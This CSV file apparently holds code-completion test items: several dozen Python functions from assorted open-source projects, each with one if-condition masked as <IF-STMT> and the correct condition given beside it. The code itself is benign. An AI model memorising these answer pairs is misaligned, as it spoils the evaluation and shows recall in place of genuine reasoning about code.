4813,"def _EvalInScriptedSection(self, codeBlock, globals, locals=None):<tab>if self.debugManager:<tab><tab>self.debugManager.OnEnterScript()<tab><tab><IF-STMT><tab><tab><tab>return self.debugManager.adb.runeval(codeBlock, globals, locals)<tab><tab>else:<tab><tab><tab>return eval(codeBlock, globals, locals)<tab>else:<tab><tab>return eval(codeBlock, globals, locals)",if self . debugManager . adb . appDebugger :,113
4814,"def load_multiple(fh, position=None, end=None):<tab>loaded = list()<tab>while position < end:<tab><tab>new_box = load(fh, position, end)<tab><tab><IF-STMT><tab><tab><tab>print(""Error, failed to load box."")<tab><tab><tab>return None<tab><tab>loaded.append(new_box)<tab><tab>position = new_box.position + new_box.size()<tab>return loaded",if new_box is None :,105
4815,"def test_loadTestsFromName__module_not_loaded(self):<tab># We're going to try to load this module as a side-effect, so it<tab># better not be loaded before we try.<tab>#<tab>module_name = ""unittest2.test.dummy""<tab>sys.modules.pop(module_name, None)<tab>loader = unittest2.TestLoader()<tab>try:<tab><tab>suite = loader.loadTestsFromName(module_name)<tab><tab>self.assertIsInstance(suite, loader.suiteClass)<tab><tab>self.assertEqual(list(suite), [])<tab><tab># module should now be loaded, thanks to loadTestsFromName()<tab><tab>self.assertIn(module_name, sys.modules)<tab>finally:<tab><tab><IF-STMT><tab><tab><tab>del sys.modules[module_name]",if module_name in sys . modules :,190
4816,"def copy_file(s, d, xform=None):<tab>with open(s, ""rb"") as f:<tab><tab>text = f.read()<tab>if xform:<tab><tab>(d, text) = xform(d, text)<tab>if os.path.exists(d):<tab><tab><IF-STMT><tab><tab><tab>print >>sys.stderr, ""Overwriting %s."" % d<tab><tab>else:<tab><tab><tab>print >>sys.stderr, ""Not overwriting %s."" % d<tab><tab><tab>return<tab>else:<tab><tab>print >>sys.stderr, ""Writing %s."" % d<tab>with open(d, ""wb"") as f:<tab><tab>f.write(text)",if opts . force :,162
4817,"def __setitem__(self, index, image):<tab>if isinstance(index, slice):<tab><tab>tmp_idx = self.current_index<tab><tab>slice_ = self.validate_slice(index)<tab><tab>del self[slice_]<tab><tab>self.extend(image, offset=slice_.start)<tab><tab>self.current_index = tmp_idx<tab>else:<tab><tab><IF-STMT><tab><tab><tab>raise TypeError(<tab><tab><tab><tab>""image must be an instance of wand.image.""<tab><tab><tab><tab>""BaseImage, not "" + repr(image)<tab><tab><tab>)<tab><tab>with self.index_context(index) as index:<tab><tab><tab>library.MagickRemoveImage(self.image.wand)<tab><tab><tab>library.MagickAddImage(self.image.wand, image.wand)","if not isinstance ( image , BaseImage ) :",196
4818,"def _configure_legacy_instrument_class(self):<tab>if self.inherits:<tab><tab>self.dispatch._update(self.inherits.dispatch)<tab><tab>super_extensions = set(<tab><tab><tab>chain(*[m._deprecated_extensions for m in self.inherits.iterate_to_root()])<tab><tab>)<tab>else:<tab><tab>super_extensions = set()<tab>for ext in self._deprecated_extensions:<tab><tab><IF-STMT><tab><tab><tab>ext._adapt_instrument_class(self, ext)",if ext not in super_extensions :,125
4819,"def tearDown(self):<tab>exc, _, _ = sys.exc_info()<tab>if exc:<tab><tab>try:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>diags = self.obj.get_error_diagnostics()<tab><tab><tab><tab>if diags:<tab><tab><tab><tab><tab>for line in diags:<tab><tab><tab><tab><tab><tab>ROOT_LOGGER.info(line)<tab><tab>except BaseException:<tab><tab><tab>pass<tab>if self.captured_logger:<tab><tab>self.captured_logger.removeHandler(self.log_recorder)<tab><tab>self.log_recorder.close()<tab>sys.stdout = self.stdout_backup<tab>super(BZTestCase, self).tearDown()","if hasattr ( self , ""obj"" ) and isinstance ( self . obj , SelfDiagnosable ) :",179
4820,"def number_operators(self, a, b, skip=[]):<tab>dict = {""a"": a, ""b"": b}<tab>for name, expr in self.binops.items():<tab><tab><IF-STMT><tab><tab><tab>name = ""__%s__"" % name<tab><tab><tab>if hasattr(a, name):<tab><tab><tab><tab>res = eval(expr, dict)<tab><tab><tab><tab>self.binop_test(a, b, res, expr, name)<tab>for name, expr in list(self.unops.items()):<tab><tab>if name not in skip:<tab><tab><tab>name = ""__%s__"" % name<tab><tab><tab>if hasattr(a, name):<tab><tab><tab><tab>res = eval(expr, dict)<tab><tab><tab><tab>self.unop_test(a, res, expr, name)",if name not in skip :,189
4821,"def _parse_cachecontrol(self, r):<tab>if r not in self._cc_parsed:<tab><tab>cch = r.headers.get(b""Cache-Control"", b"""")<tab><tab>parsed = parse_cachecontrol(cch)<tab><tab><IF-STMT><tab><tab><tab>for key in self.ignore_response_cache_controls:<tab><tab><tab><tab>parsed.pop(key, None)<tab><tab>self._cc_parsed[r] = parsed<tab>return self._cc_parsed[r]","if isinstance ( r , Response ) :",121
4822,"def make_pattern(wtree):<tab>subpattern = []<tab>for part in wtree[1:-1]:<tab><tab>if isinstance(part, list):<tab><tab><tab>part = make_pattern(part)<tab><tab><IF-STMT><tab><tab><tab>for c in part:<tab><tab><tab><tab># Meta-characters cannot be quoted<tab><tab><tab><tab>if c in special_chars:<tab><tab><tab><tab><tab>raise GlobError()<tab><tab>subpattern.append(part)<tab>return """".join(subpattern)","elif wtree [ 0 ] != """" :",123
4823,"def iterjlines(f, header, missing):<tab>it = iter(f)<tab>if header is None:<tab><tab>header = list()<tab><tab>peek, it = iterpeek(it, 1)<tab><tab>json_obj = json.loads(peek)<tab><tab><IF-STMT><tab><tab><tab>header += [k for k in json_obj.keys() if k not in header]<tab>yield tuple(header)<tab>for o in it:<tab><tab>json_obj = json.loads(o)<tab><tab>yield tuple(json_obj[f] if f in json_obj else missing for f in header)","if hasattr ( json_obj , ""keys"" ) :",149
4824,"def logprob(self, sample):<tab>if self._log:<tab><tab>return self._prob_dict.get(sample, _NINF)<tab>else:<tab><tab>if sample not in self._prob_dict:<tab><tab><tab>return _NINF<tab><tab><IF-STMT><tab><tab><tab>return _NINF<tab><tab>else:<tab><tab><tab>return math.log(self._prob_dict[sample], 2)",elif self . _prob_dict [ sample ] == 0 :,102
4825,"def TryMerge(self, d):<tab>while d.avail() > 0:<tab><tab>tt = d.getVarInt32()<tab><tab>if tt == 10:<tab><tab><tab>length = d.getVarInt32()<tab><tab><tab>tmp = ProtocolBuffer.Decoder(d.buffer(), d.pos(), d.pos() + length)<tab><tab><tab>d.skip(length)<tab><tab><tab>self.add_public_certificate_list().TryMerge(tmp)<tab><tab><tab>continue<tab><tab>if tt == 16:<tab><tab><tab>self.set_max_client_cache_time_in_second(d.getVarInt64())<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>raise ProtocolBuffer.ProtocolBufferDecodeError<tab><tab>d.skipData(tt)",if tt == 0 :,181
4826,"def acquire(self, blocking=True, timeout=None):<tab>if not blocking and timeout is not None:<tab><tab>raise ValueError(""can't specify timeout for non-blocking acquire"")<tab>rc = False<tab>endtime = None<tab>self._cond.acquire()<tab>while self._value == 0:<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>if timeout is not None:<tab><tab><tab>if endtime is None:<tab><tab><tab><tab>endtime = _time() + timeout<tab><tab><tab>else:<tab><tab><tab><tab>timeout = endtime - _time()<tab><tab><tab><tab>if timeout <= 0:<tab><tab><tab><tab><tab>break<tab><tab>self._cond.wait(timeout)<tab>else:<tab><tab>self._value = self._value - 1<tab><tab>rc = True<tab>self._cond.release()<tab>return rc",if not blocking :,194
4827,def run_train_loop(self):<tab>self.begin_training()<tab>for _ in self.yield_train_step():<tab><tab>if self.should_save_model():<tab><tab><tab>self.save_model()<tab><tab>if self.should_save_checkpoint():<tab><tab><tab>self.save_checkpoint()<tab><tab><IF-STMT><tab><tab><tab>self.eval_model()<tab><tab>if self.should_break_training():<tab><tab><tab>break<tab>self.eval_model()<tab>self.done_training()<tab>return self.returned_result(),if self . should_eval_model ( ) :,139
4828,"def scrape_me(url_path, **options):<tab>host_name = (<tab><tab>get_host_name(url_path) if not options.get(""test"", False) else ""test_wild_mode""<tab>)<tab>try:<tab><tab>scraper = SCRAPERS[host_name]<tab>except KeyError:<tab><tab><IF-STMT><tab><tab><tab>wild_scraper = SchemaScraperFactory.generate(url_path, **options)<tab><tab><tab>if not wild_scraper.schema.data:<tab><tab><tab><tab>raise NoSchemaFoundInWildMode(url_path)<tab><tab><tab>return wild_scraper<tab><tab>else:<tab><tab><tab>raise WebsiteNotImplementedError(host_name)<tab>return scraper(url_path, **options)","if options . get ( ""wild_mode"" , False ) :",197
4829,"def iter_expressions(self):<tab>if not self._isrecord:<tab><tab>tri_attr_context = [(""target"", SPECIAL_INOUT)]<tab>else:<tab><tab>tri_attr_context = [<tab><tab><tab>(""_target_o"", SPECIAL_OUTPUT),<tab><tab><tab>(""_target_oe"", SPECIAL_OUTPUT),<tab><tab><tab>(""_target_i"", SPECIAL_INPUT),<tab><tab>]<tab>tri_attr_context += [<tab><tab>(""o"", SPECIAL_INPUT),<tab><tab>(""oe"", SPECIAL_INPUT),<tab><tab>(""i"", SPECIAL_OUTPUT),<tab>]<tab>for attr, target_context in tri_attr_context:<tab><tab><IF-STMT><tab><tab><tab>yield self, attr, target_context","if getattr ( self , attr ) is not None :",176
4830,"def get_field_values(self, fields):<tab>field_values = []<tab>for field in fields:<tab><tab># Title is special case<tab><tab>if field == ""title"":<tab><tab><tab>value = self.get_title_display()<tab><tab>elif field == ""country"":<tab><tab><tab>try:<tab><tab><tab><tab>value = self.country.printable_name<tab><tab><tab>except exceptions.ObjectDoesNotExist:<tab><tab><tab><tab>value = """"<tab><tab><IF-STMT><tab><tab><tab>value = self.salutation<tab><tab>else:<tab><tab><tab>value = getattr(self, field)<tab><tab>field_values.append(value)<tab>return field_values","elif field == ""salutation"" :",158
4831,"def show_panel(panel_id):<tab># Iterate positions to find where panel is and bring it to front.<tab>for position in _positions_names:<tab><tab>pos_panel_ids = _get_position_panels(position)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if len(pos_panel_ids) == 1:<tab><tab><tab>continue<tab><tab>panel_widget = _get_panels_widgets_dict(gui.editor_window)[panel_id]<tab><tab>notebook = _position_notebooks[position]<tab><tab>for i in range(0, notebook.get_n_pages()):<tab><tab><tab>notebook_page = notebook.get_nth_page(i)<tab><tab><tab>if notebook_page == panel_widget:<tab><tab><tab><tab>notebook.set_current_page(i)",if len ( pos_panel_ids ) == 0 :,197
4832,"def draw(self):<tab>program = self._program<tab>collection = self._collection<tab>mode = collection._mode<tab>if collection._need_update:<tab><tab>collection._update()<tab><tab># self._program.bind(self._vertices_buffer)<tab><tab><IF-STMT><tab><tab><tab>program[""uniforms""] = collection._uniforms_texture<tab><tab><tab>program[""uniforms_shape""] = collection._ushape<tab>if collection._indices_list is not None:<tab><tab>program.draw(mode, collection._indices_buffer)<tab>else:<tab><tab>program.draw(mode)",if collection . _uniforms_list is not None :,145
4833,"def release(provider, connection, cache=None):<tab>if cache is not None:<tab><tab>db_session = cache.db_session<tab><tab>if db_session is not None and db_session.ddl and cache.saved_fk_state:<tab><tab><tab>try:<tab><tab><tab><tab>cursor = connection.cursor()<tab><tab><tab><tab>sql = ""SET foreign_key_checks = 1""<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>log_orm(sql)<tab><tab><tab><tab>cursor.execute(sql)<tab><tab><tab>except:<tab><tab><tab><tab>provider.pool.drop(connection)<tab><tab><tab><tab>raise<tab>DBAPIProvider.release(provider, connection, cache)",if core . local . debug :,164
4834,"def expanded_output(self):<tab>""""""Iterate over output files while dynamic output is expanded.""""""<tab>for f, f_ in zip(self.output, self.rule.output):<tab><tab><IF-STMT><tab><tab><tab>expansion = self.expand_dynamic(f_)<tab><tab><tab>if not expansion:<tab><tab><tab><tab>yield f_<tab><tab><tab>for f, _ in expansion:<tab><tab><tab><tab>file_to_yield = IOFile(f, self.rule)<tab><tab><tab><tab>file_to_yield.clone_flags(f_)<tab><tab><tab><tab>yield file_to_yield<tab><tab>else:<tab><tab><tab>yield f",if f in self . dynamic_output :,153
4835,"def __new__(cls, xs: Tuple[Optional[AbstractValue], core.Value]):<tab>pv, const = xs<tab>if not core.skip_checks:<tab><tab># type checks<tab><tab>assert isinstance(pv, (AbstractValue, type(None))), xs<tab><tab>assert (<tab><tab><tab>isinstance(const, core.Tracer)<tab><tab><tab>or type(const) is Zero<tab><tab><tab>or core.valid_jaxtype(const)<tab><tab>), xs<tab><tab># invariant checks<tab><tab><IF-STMT><tab><tab><tab>assert get_aval(const) == core.abstract_unit, xs<tab>return tuple.__new__(cls, xs)","if isinstance ( pv , AbstractValue ) :",156
4836,"def MenuItemSearch(menu, item):<tab>for menuItem in list(menu.GetMenuItems()):<tab><tab>label = menuItem.GetItemLabel()<tab><tab>if not label:<tab><tab><tab># It's a separator<tab><tab><tab>continue<tab><tab>shortcutItem = Shortcut(menuItem=menuItem)<tab><tab>shortcutItem.FromMenuItem()<tab><tab>item.AppendItem(shortcutItem)<tab><tab>subMenu = menuItem.GetSubMenu()<tab><tab><IF-STMT><tab><tab><tab>MenuItemSearch(subMenu, shortcutItem)",if subMenu :,117
4837,"def fill_potential_satellites_by_type(self, sat_type):<tab>setattr(self, ""potential_%s"" % sat_type, [])<tab>for satellite in getattr(self, sat_type):<tab><tab>getattr(self, ""potential_%s"" % sat_type).append(satellite)<tab>for realm in self.higher_realms:<tab><tab>for satellite in getattr(realm, sat_type):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>getattr(self, ""potential_%s"" % sat_type).append(satellite)",if satellite . manage_sub_realms :,142
4838,"def _gen():<tab>while True:<tab><tab>try:<tab><tab><tab>loop_val = it.next()  # e.g. x<tab><tab>except StopIteration:<tab><tab><tab>break<tab><tab>self.mem.SetValue(<tab><tab><tab>lvalue.Named(iter_name), value.Obj(loop_val), scope_e.LocalOnly<tab><tab>)<tab><tab>if comp.cond:<tab><tab><tab>b = self.EvalExpr(comp.cond)<tab><tab>else:<tab><tab><tab>b = True<tab><tab><IF-STMT><tab><tab><tab>item = self.EvalExpr(node.elt)  # e.g. x*2<tab><tab><tab>yield item",if b :,155
4839,"def _iter_backtick_string(gen, line, back_start):<tab>for _, tokval, start, _, _ in gen:<tab><tab><IF-STMT><tab><tab><tab>return (<tab><tab><tab><tab>BACKTICK_TAG<tab><tab><tab><tab>+ binascii.b2a_hex(line[back_start[1] + 1 : start[1]].encode()).decode()<tab><tab><tab>)<tab>else:<tab><tab>raise SyntaxError(f""backtick quote at {back_start} does not match"")","if tokval == ""`"" :",116
4840,"def to_internal_value(self, data):<tab>site = get_current_site()<tab>pages_root = reverse(""pages-root"")<tab>ret = []<tab>for path in data:<tab><tab>if path.startswith(pages_root):<tab><tab><tab>path = path[len(pages_root) :]<tab><tab># strip any final slash<tab><tab>if path.endswith(""/""):<tab><tab><tab>path = path[:-1]<tab><tab>page = get_page_from_path(site, path)<tab><tab><IF-STMT><tab><tab><tab>ret.append(page)<tab>return ret",if page :,136
4841,"def refresh(self):<tab># In MongoTrials, this method fetches from database<tab>if self._exp_key is None:<tab><tab>self._trials = [<tab><tab><tab>tt for tt in self._dynamic_trials if tt[""state""] in JOB_VALID_STATES<tab><tab>]<tab>else:<tab><tab>self._trials = [<tab><tab><tab>tt<tab><tab><tab>for tt in self._dynamic_trials<tab><tab><tab><IF-STMT><tab><tab>]<tab>self._ids.update([tt[""tid""] for tt in self._trials])","if ( tt [ ""state"" ] in JOB_VALID_STATES and tt [ ""exp_key"" ] == self . _exp_key )",154
4842,"def create_model(self, model):<tab>for field in model._meta.local_fields:<tab><tab># Autoincrement SQL for backends with post table definition variant<tab><tab>if field.get_internal_type() == ""PositiveAutoField"":<tab><tab><tab>autoinc_sql = self.connection.ops.autoinc_sql(<tab><tab><tab><tab>model._meta.db_table, field.column<tab><tab><tab>)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.deferred_sql.extend(autoinc_sql)<tab>super().create_model(model)",if autoinc_sql :,133
4843,"def row_match(base_row, row):<tab># ildutil.ild_err(""ILD_DEBUG BASE ROW %s"" % (base_row,))<tab>for (op, val) in list(row.items()):<tab><tab><IF-STMT><tab><tab><tab>if base_row[op] != val:<tab><tab><tab><tab>return False<tab><tab>else:<tab><tab><tab>ildutil.ild_err(<tab><tab><tab><tab>""BASE ROW %s doesn't have OD %s from row %s"" % (base_row, op, row)<tab><tab><tab>)<tab><tab><tab>return None<tab>return True",if op in base_row :,148
4844,"def get_referrers(self):<tab>d = []<tab>for o in gc.get_referrers(self.obj):<tab><tab>name = None<tab><tab>if isinstance(o, dict):<tab><tab><tab>name = web.dictfind(o, self.obj)<tab><tab><tab>for r in gc.get_referrers(o):<tab><tab><tab><tab>if getattr(r, ""__dict__"", None) is o:<tab><tab><tab><tab><tab>o = r<tab><tab><tab><tab><tab>break<tab><tab>elif isinstance(o, dict):  # other dict types<tab><tab><tab>name = web.dictfind(o, self.obj)<tab><tab><IF-STMT><tab><tab><tab>name = None<tab><tab>d.append(Object(o, name))<tab>return d","if not isinstance ( name , six . string_types ) :",187
4845,"def _run(env, remote):<tab>if device == ""vta"":<tab><tab>target = env.target<tab><tab><IF-STMT><tab><tab><tab>assert tvm.runtime.enabled(""rpc"")<tab><tab><tab>program_fpga(remote, bitstream=None)<tab><tab><tab>reconfig_runtime(remote)<tab>elif device == ""arm_cpu"":<tab><tab>target = env.target_vta_cpu<tab>with autotvm.tophub.context(target):  # load pre-tuned schedule parameters<tab><tab>for _, wl in resnet_wkls:<tab><tab><tab>print(wl)<tab><tab><tab>run_conv2d(env, remote, wl, target)","if env . TARGET not in [ ""sim"" , ""tsim"" ] :",169
4846,"def retrieve(self, aclass):<tab>""""""Look for a specifc class/name in the packet""""""<tab>resu = []<tab>for x in self.payload:<tab><tab>try:<tab><tab><tab>if isinstance(aclass, str):<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>resu.append(x)<tab><tab><tab>else:<tab><tab><tab><tab>if isinstance(x, aclass):<tab><tab><tab><tab><tab>resu.append(x)<tab><tab><tab>resu += x.retrieve(aclass)<tab><tab>except:<tab><tab><tab>pass<tab>return resu",if x . name == aclass :,144
4847,"def summary_passes(self):<tab>if self.config.option.tbstyle != ""no"":<tab><tab>if self.hasopt(""P""):<tab><tab><tab>reports = self.getreports(""passed"")<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return<tab><tab><tab>self.write_sep(""="", ""PASSES"")<tab><tab><tab>for rep in reports:<tab><tab><tab><tab>msg = self._getfailureheadline(rep)<tab><tab><tab><tab>self.write_sep(""_"", msg)<tab><tab><tab><tab>self._outrep_summary(rep)",if not reports :,127
4848,"def fn():<tab>random_states = {<tab><tab>name: cls.random_state_function(state_spec=state_spec)()<tab><tab>for name, state_spec in states_spec.items()<tab>}<tab>for name, action_spec in actions_spec.items():<tab><tab><IF-STMT><tab><tab><tab>mask = cls.random_mask(action_spec=action_spec)<tab><tab><tab>random_states[name + ""_mask""] = mask<tab>return random_states","if action_spec [ ""type"" ] == ""int"" :",121
4849,"def _show_option(name=None):<tab>if name is None:<tab><tab>name = """"<tab>filename = peda.getfile()<tab>if filename:<tab><tab>filename = os.path.basename(filename)<tab>else:<tab><tab>filename = None<tab>for (k, v) in sorted(config.Option.show(name).items()):<tab><tab><IF-STMT><tab><tab><tab>v = v.replace(""#FILENAME#"", filename)<tab><tab>msg(""%s = %s"" % (k, repr(v)))<tab>return","if filename and isinstance ( v , str ) and ""#FILENAME#"" in v :",137
4850,"def _set_posonly_args_def(self, argmts, vals):<tab>for v in vals:<tab><tab>argmts.posonlyargs.append(v[""arg""])<tab><tab>d = v[""default""]<tab><tab><IF-STMT><tab><tab><tab>argmts.defaults.append(d)<tab><tab>elif argmts.defaults:<tab><tab><tab>self._set_error(""non-default argument follows default argument"")",if d is not None :,97
4851,def get(self):<tab>with self._lock:<tab><tab><IF-STMT><tab><tab><tab>self._connection = psycopg2.connect(**self._conn_kwargs)<tab><tab><tab>self._connection.autocommit = True<tab><tab><tab>self.server_version = self._connection.server_version<tab>return self._connection,if not self . _connection or self . _connection . closed != 0 :,83
4852,"def _Determine_Do(self):<tab>if sys.platform == ""darwin"":<tab><tab>self.applicable = True<tab><tab>for opt, optarg in self.chosenOptions:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.value = os.path.abspath(optarg)<tab><tab><tab><tab>break<tab>else:<tab><tab>self.applicable = False<tab>self.determined = True","if opt == ""--"" + self . longopt :",97
4853,"def delete_tags(filenames, v1, v2):<tab>for filename in filenames:<tab><tab>with _sig.block():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>print_(u""deleting ID3 tag info in"", filename, file=sys.stderr)<tab><tab><tab>mutagen.id3.delete(filename, v1, v2)",if verbose :,81
4854,"def startJail(self, name):<tab>with self.__lock:<tab><tab>jail = self.__jails[name]<tab><tab>if not jail.isAlive():<tab><tab><tab>jail.start()<tab><tab><IF-STMT><tab><tab><tab>logSys.info(""Jail %r reloaded"", name)<tab><tab><tab>del self.__reload_state[name]<tab><tab>if jail.idle:<tab><tab><tab>jail.idle = False",elif name in self . __reload_state :,111
4855,"def get_field_by_name(obj, field):<tab># Dereference once<tab>if obj.type.code == gdb.TYPE_CODE_PTR:<tab><tab>obj = obj.dereference()<tab>for f in re.split(""(->|\.|\[\d+\])"", field):<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if f == ""->"":<tab><tab><tab>obj = obj.dereference()<tab><tab>elif f == ""."":<tab><tab><tab>pass<tab><tab>elif f.startswith(""[""):<tab><tab><tab>n = int(f.strip(""[]""))<tab><tab><tab>obj = obj.cast(obj.dereference().type.pointer())<tab><tab><tab>obj += n<tab><tab><tab>obj = obj.dereference()<tab><tab>else:<tab><tab><tab>obj = obj[f]<tab>return obj",if not f :,189
4856,"def _parse_yum_or_zypper_repositories(output):<tab>repos = []<tab>current_repo = {}<tab>for line in output:<tab><tab>line = line.strip()<tab><tab>if not line or line.startswith(""#""):<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>if current_repo:<tab><tab><tab><tab>repos.append(current_repo)<tab><tab><tab><tab>current_repo = {}<tab><tab><tab>current_repo[""name""] = line[1:-1]<tab><tab>if current_repo and ""="" in line:<tab><tab><tab>key, value = line.split(""="", 1)<tab><tab><tab>current_repo[key] = value<tab>if current_repo:<tab><tab>repos.append(current_repo)<tab>return repos","if line . startswith ( ""["" ) :",179
4857,"def add_to_auto_transitions(cls, base):<tab>result = {}<tab>for name, method in base.__dict__.items():<tab><tab><IF-STMT><tab><tab><tab>for name, transition in method._django_fsm.transitions.items():<tab><tab><tab><tab>if transition.custom.get(""auto""):<tab><tab><tab><tab><tab>result.update({name: method})<tab>return result","if callable ( method ) and hasattr ( method , ""_django_fsm"" ) :",103
4858,"def commit(cache):<tab>assert cache.is_alive<tab>try:<tab><tab><IF-STMT><tab><tab><tab>cache.flush()<tab><tab>if cache.in_transaction:<tab><tab><tab>assert cache.connection is not None<tab><tab><tab>cache.database.provider.commit(cache.connection, cache)<tab><tab>cache.for_update.clear()<tab><tab>cache.query_results.clear()<tab><tab>cache.max_id_cache.clear()<tab><tab>cache.immediate = True<tab>except:<tab><tab>cache.rollback()<tab><tab>raise",if cache . modified :,131
4859,"def block_items(objekt, block, eldict):<tab>if objekt not in block:<tab><tab>if isinstance(objekt.type, PyType):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>block.append(objekt.type)<tab><tab>block.append(objekt)<tab><tab>if isinstance(objekt, PyType):<tab><tab><tab>others = [<tab><tab><tab><tab>p<tab><tab><tab><tab>for p in eldict.values()<tab><tab><tab><tab>if isinstance(p, PyElement) and p.type[1] == objekt.name<tab><tab><tab>]<tab><tab><tab>for item in others:<tab><tab><tab><tab>if item not in block:<tab><tab><tab><tab><tab>block.append(item)<tab>return block",if objekt . type not in block :,186
4860,"def __getattr__(self, item):<tab>import pyarrow.lib<tab>ret = getattr(plasma, item, None)<tab>if ret is None:  # pragma: no cover<tab><tab><IF-STMT><tab><tab><tab>ret = getattr(plasma, ""PlasmaObjectNonexistent"", None) or getattr(<tab><tab><tab><tab>pyarrow.lib, ""PlasmaObjectNonexistent""<tab><tab><tab>)<tab><tab>elif item == ""PlasmaStoreFull"":<tab><tab><tab>ret = getattr(pyarrow.lib, item)<tab>if ret is not None:<tab><tab>setattr(self, item, ret)<tab>return ret","if item == ""PlasmaObjectNotFound"" :",133
4861,"def clean_str(*args):<tab>tdict = {""str"": 0, ""bytearray"": 1, ""unicode"": 2}<tab>for obj in args:<tab><tab>k = tdict.get(type(obj).__name__)<tab><tab><IF-STMT><tab><tab><tab>raise RuntimeError(""Can not clean object: %s"" % obj)<tab><tab>clean_obj(obj, k)",if k is None :,87
4862,"def incoming():<tab>while True:<tab><tab>m = ws.receive()<tab><tab><IF-STMT><tab><tab><tab>m = str(m)<tab><tab><tab>print((m, len(m)))<tab><tab><tab>if len(m) == 35:<tab><tab><tab><tab>ws.close()<tab><tab><tab><tab>break<tab><tab>else:<tab><tab><tab>break<tab>print((""Connection closed!"",))",if m is not None :,94
4863,"def TryMerge(self, d):<tab>while d.avail() > 0:<tab><tab>tt = d.getVarInt32()<tab><tab>if tt == 8:<tab><tab><tab>self.add_set_status(d.getVarInt32())<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>raise ProtocolBuffer.ProtocolBufferDecodeError<tab><tab>d.skipData(tt)",if tt == 0 :,92
4864,"def __init__(self, text, menu):<tab>self.text = text<tab>self.menu = menu<tab>print(text)<tab>for i, option in enumerate(menu):<tab><tab>menunum = i + 1<tab><tab># Check to see if this line has the 'return to main menu' code<tab><tab>match = re.search(""0D"", option)<tab><tab># If it's not the return to menu line:<tab><tab><IF-STMT><tab><tab><tab>if menunum < 10:<tab><tab><tab><tab>print((""   %s) %s"" % (menunum, option)))<tab><tab><tab>else:<tab><tab><tab><tab>print((""  %s) %s"" % (menunum, option)))<tab><tab>else:<tab><tab><tab>print(""\n  99) Return to Main Menu\n"")<tab>return",if not match :,193
4865,def take_step(self):<tab>with self.walk_lock:<tab><tab># Share my random channels<tab><tab>peers = self.overlay.get_peers()<tab><tab><IF-STMT><tab><tab><tab>peer = choice(peers)<tab><tab><tab>self.overlay.send_random_to(peer),if peers :,74
4866,"def clear_highlight(self):<tab>for doc in self._window.get_documents():<tab><tab>start, end = doc.get_bounds()<tab><tab><IF-STMT><tab><tab><tab>tag = doc.create_tag(<tab><tab><tab><tab>""result_highlight"", foreground=""yellow"", background=""red""<tab><tab><tab>)<tab><tab>doc.remove_tag_by_name(""result_highlight"", start, end)","if doc . get_tag_table ( ) . lookup ( ""result_highlight"" ) == None :",111
4867,"def impl(self, to_strip=None):<tab>mask = get_nan_mask(self._data._data)<tab>item_count = len(self._data)<tab>res_list = [""""] * item_count<tab>for it in range(item_count):<tab><tab>item = self._data._data[it]<tab><tab><IF-STMT><tab><tab><tab>res_list[it] = usecase(item, to_strip)<tab><tab>else:<tab><tab><tab>res_list[it] = item<tab>str_arr = create_str_arr_from_list(res_list)<tab>result = str_arr_set_na_by_mask(str_arr, mask)<tab>return pandas.Series(result, self._data._index, name=self._data._name)",if len ( item ) > 0 :,188
4868,"def modify_subnet_attribute(self):<tab>subnet_id = self._get_param(""SubnetId"")<tab>for attribute in (""MapPublicIpOnLaunch"", ""AssignIpv6AddressOnCreation""):<tab><tab><IF-STMT><tab><tab><tab>attr_name = camelcase_to_underscores(attribute)<tab><tab><tab>attr_value = self.querystring.get(""%s.Value"" % attribute)[0]<tab><tab><tab>self.ec2_backend.modify_subnet_attribute(subnet_id, attr_name, attr_value)<tab><tab><tab>return MODIFY_SUBNET_ATTRIBUTE_RESPONSE","if self . querystring . get ( ""%s.Value"" % attribute ) :",149
4869,"def join(s, *p):<tab>path = s<tab>for t in p:<tab><tab>if (not s) or isabs(t):<tab><tab><tab>path = t<tab><tab><tab>continue<tab><tab>if t[:1] == "":"":<tab><tab><tab>t = t[1:]<tab><tab>if "":"" not in path:<tab><tab><tab>path = "":"" + path<tab><tab><IF-STMT><tab><tab><tab>path = path + "":""<tab><tab>path = path + t<tab>return path","if path [ - 1 : ] != "":"" :",115
4870,"def publish(self):<tab># monoproc<tab>if not self.modules.has_option(self.subscriber_name, ""publish""):<tab><tab>return False<tab>dest = self.modules.get(self.subscriber_name, ""publish"")<tab># We can have multiple publisher<tab>for name in dest.split("",""):<tab><tab>self.pubsub.setup_publish(name)<tab>while True:<tab><tab>message = self.r_temp.spop(self.subscriber_name + ""out"")<tab><tab><IF-STMT><tab><tab><tab>time.sleep(1)<tab><tab><tab>continue<tab><tab>self.pubsub.publish(message)",if message is None :,151
4871,"def ignore(self, other):<tab>if isinstance(other, Suppress):<tab><tab><IF-STMT><tab><tab><tab>super().ignore(other)<tab><tab><tab>if self.expr is not None:<tab><tab><tab><tab>self.expr.ignore(self.ignoreExprs[-1])<tab>else:<tab><tab>super().ignore(other)<tab><tab>if self.expr is not None:<tab><tab><tab>self.expr.ignore(self.ignoreExprs[-1])<tab>return self",if other not in self . ignoreExprs :,117
4872,"def recurse(node):<tab>for child in node.childNodes:<tab><tab>if child.nodeType != child.ELEMENT_NODE:<tab><tab><tab>continue<tab><tab>if child.nodeName.upper() == ""H1"":<tab><tab><tab>return child<tab><tab><IF-STMT><tab><tab><tab>return recurse(child)",if child not in visited :,76
